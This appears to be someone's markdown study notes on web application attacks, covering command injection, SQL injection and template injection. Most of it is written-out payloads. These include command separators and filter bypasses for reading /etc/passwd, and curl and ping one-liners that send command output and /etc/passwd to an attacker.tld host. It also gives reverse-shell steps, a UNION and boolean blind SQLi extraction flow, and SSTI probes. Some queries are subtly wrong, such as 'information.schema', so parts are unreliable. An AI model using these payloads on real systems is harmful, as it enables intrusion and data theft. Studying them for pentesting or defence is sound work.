# OWASP
first of all have a look at [payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) and save it for other uses.

> [Orange](https://blog.orange.tw/) has good article to read.


## Command Injection
### Basics
whenever we see a suspicious input, we fuzz it. we need to use command separators.
> Recon means try to detect the injection. *it coms from recognize*
```console
; #cut the befoce cmd
&& #run this cmd if that command is tru
| #give result of last cmd to next
|| #is or
`code here` #it open a cmd executor
$(code here) #it opens a cmd exec
{code,here} #if we cant use space
cat$IFS/etc/passwd # if we cant use space ($IFS means space)
cat ${HOME:0:1}etc${HOME:0:1}passwd # {HOME:0:1} means /
```
Out of band means use web app for in out of boundry. *for example use to web send request to another space*
it can be DNS, HTTP or ...
we use this method when doesnt return the output of the injected command. for blind.
we request to our server.
```console
; wget attecker.com
```
#### let's read
- [we hacked apple for 3 months](samcurry.net/hacking-apple/#vuln4)
- [LocalTapiola: RCE using bash command](hackerone.com/reports/303061)

### Data Exfiltration
For Data Exfiltration (extracting data) u should use these two:
- HTTP Data Exfiltration
- DNS Data Exfiltration

#### HTTP
> search request catcher to get a simple server for testing out of bound.

for sending a command or file use these two:
```console
curl https://attacker.tld -d $(cmd) # for cmd result
curl https://attacker.tld --data-binary @/etc/passwd # for sending file
```
#### DNS
>  look for dns logger to get dns requests (DNS). an example is [DNSbin](dnsbin.zhack.ca)

command is:
```console
ping -c 1 $(whoami).attacker.tld # for sending cmd result
uname -a | od -A n -t x1 | sed 's/ *//g' | while read exfil; do ping -c 1 $exfil.attacker.tld; done # for sending hexed file
```
### Reverse Shell
for reverse shell we force the target machine to connect back to attacking machine.

Procedure:
- attacker's machine listen on a port
- victim's machine connect to the port
- victim spawns a shell
- attacker will have the shell

> look at this [site](revshells.com) for get some payload.

> commix is sth like sqlmap :)


## RCE
rce means u can put code in web app.
for inline import in python u can use this:
```python
__import__('PACKAGE_NAME').FUNCTINON('ARGS')
```

## SQL Injection
in sqli we wanna exploit the query.
this is a simple sqli
```sql
SELECT FROM USER WHERE username = ''; SELECT 1=1; --
```

### intraction
we have three kind of intraction between web app and sql.
- data returns directly to user
- data processed and the result shows to user
- nothing returns to user

#### Direct
look at this example:
> https://site.com/news/54

in this case 54 is id of a data in sql so the qury must be like one of this:
```sql
SELECT * FROM news WHERE news_id = $NEWSID;
SELECT * FROM news WHERE news_id = '$NEWSID';
SELECT * FROM news WHERE news_id = "$NEWSID";
```
so it shows all thing to us directly and we can exploit it by **UNION**.

#### Indirect
suppose we wanna buy sth from a shop and when we click on a product it query to sql and if it has it shows us exist else doesnt exist.
so in this case data is porocessed and then the result shown us.
query must be like this:
```sql
SELECT IF ((SELECT count FROM products WHERE product_id = $PRODUCT_ID) > 0, 1, 0) # 0 or 1
```
here doesnt show data just an effect of it.

*We use blind sqli in this case **(boolean based)***

#### NO result
for example for users and ips of a web app it doesnt show u any data. but will do sth.
```sql
INSERT INTO table_name VALUES (value1, value2, ...)
```
there is no view here but we have time effect.

*so we use blind sqli as a **time based***

### Explotation Flow
Based on user privilage we can do many things:
- pulling data from each databse that user has access
- read file
- write file
-  command excutaion

for extracting data u should know, ***data base name***, ***table name*** and ***column name***.

> **sqli** -> extract database names -> extract table names -> extract column names -> **pulling out data**

we can pull information with **information_schema**:
- `SELECT schema_name FROM information.schema.schemata` -> shows all database which the user has access to
- `SELECT table_name FROM information.schema.tables` -> shows all tables which the user has access to
- `SELECT column_name FROM information.schema.columns` -> shows all columns which the user has access to

u can use various fliters. for examle in this query it retunrns only column names of a specific database and table:
```SQL
SELECT group_concat(cloumn_name) FROM information.schema.columns WHERE table_schema='DATABASE_NAME' AND table_name='TABLE_NAME' 
```

### UNION
in MYSQL:
- when using `ORDER BY` to order datas by a column name or number. *(if it doesnt exist it will raise an error)*
- when using `UNION SELECT` the number of columns (and order of columns) must be same
- `UNION SELECT` cant use after `ORDER BY`.

a test that use `ORDER BY` vulnerablilty.
```SQL
Default request:
page/?id=54


Test 1:
page/?id=54 ORDER BY 1
page/?id=54' ORDER BY 1#
page/?id=54" ORDER BY 1#


Test 2:
page/?id=54 ORDER BY 1000
page/?id=54' ORDER BY 1000#
page/?id=54" ORDER BY 1000#
```

we can confirm we have sql injection when:
- Test 1 == Default
- Test 2 != Test 1

b/c it hard to be selected 1000 columns so it must raise error and two tests cant be same.

suppose u dont know the first `SELECT` so in this case u must try to find that how many columns are selected.
first look at this to get what i mean about first `SELECT`.
> `SELECT * FROM TABLE_NAME WHERE id=54` the part `SELECT *` is first `SELECT`.

so now u know what we talking about. so look at the tries for exploiting.
```SQL
page/?id=54 ORDER BY 1 # same as default request
page/?id=54 ORDER BY 2 # same as default request
page/?id=54 ORDER BY 3 # same as default request
page/?id=54 ORDER BY 4 # not same as default request
```
so we get that the first `SELECT` select 3 column. in the end we exploit like this via `UNION SELECT`.
```SQL
page/?id=54 UNION SELECT 1,2,3#
```

> if u rn't allowed to use qoute(s), u can use HEX code only and only for strings.


### Blind SQLi
- boolean based -> *there is a processed result of data*:
  - the attack released in `True` or `False` detection.
  ```SQL
    Default request:
    page/?id=54


    Test 1:
    page/?id=54 and 1=1
    page/?id=54' and '1'='1
    page/?id=54" and "1"="1


    Test 2:
    page/?id=54 and 1=2
    page/?id=54' and '1'='2
    page/?id=54" and "1"="2
  ```
  - we can confirm sqli when:
    - Test 1 == Default request
    - Test 2 != Test 1
- time bases bline -> *there is no data*:
    - the attack release by time sleeping of HTTP request:
    ```SQL
    page/?id=54 and sleep(10)
    page/?id=54' and sleep(10)#
    page/?id=54" and sleep(10)#
    ```

> sometimes mostly when u seeing a search box query isnt like this `keyword = $INPUT` its like this `keyword like '%INPUT%'` b/c in search we dont wanna exact word. so in this case we need to change our injection to this: `test%' and 1=1#`

for exploiting data:
- sepcify two conditions, a `True` one and a `False` one.
- use sth like `IF` to extract data.
- u cant extract whole data so do it byte by byte
lets make an example:
```SQL
page/?id=54 and 1=1 # True one
page/?id=54 and 1=2 # Flase one
page/?id=54 and 1=IF(2>1,1,0) # True one
page/?id=54 and 1=IF(1>2,1,0) # Flase one
```
lets extract databse name length:
```SQL
page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>1,1,2)-- - # True one
page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>2,1,2)-- - # True one
page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>3,1,2)-- - # True one
page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>4,1,2)-- - # True one
page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>5,1,2)-- - # True one
page/?id=54 and 1=IF((SELECT LENGTH(DATABASE()))>6,1,2)-- - # False one
```
so database name length is 6.

### SQLmap
it use for detecting and exploiting sqli.

[here](https://github.com/sqlmapproject/sqlmap) is github repository of it.

## SSTI (Server-Side Template Injection)
u can inject malicious code in web app template.

in ssti:
- dynamic content pass to template.
- so user can inject code
- the flow is like this: detect -> identify template engine -> exploit
- detection payload is:
  ```code
  {{7*7}}
  ${7*7}
  <%= 7*7%>
  ${{7*7}}
  #{7*7}
  ${{<%[%'"}}%\
  ```

  ### Tplmap
  is sth like sqlmap :)
  
  [here](https://github.com/epinna/tplmap?tab=readme-ov-file) is github repository of it.